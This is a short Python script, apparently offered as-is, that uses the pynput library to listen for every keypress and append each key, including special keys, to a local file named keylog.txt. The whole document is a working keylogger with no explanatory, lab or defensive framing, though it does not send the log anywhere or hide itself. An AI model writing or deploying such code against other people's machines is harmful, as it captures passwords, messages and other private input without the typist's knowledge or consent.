from pynput.keyboard import Listener

# Function to log keys pressed
def on_press(key):
    try:
        # Logging the key pressed
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}\n")
    except AttributeError:
        # For special keys (like shift, space, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key}\n")

# Start listening for key events
with Listener(on_press=on_press) as listener:
    listener.join()
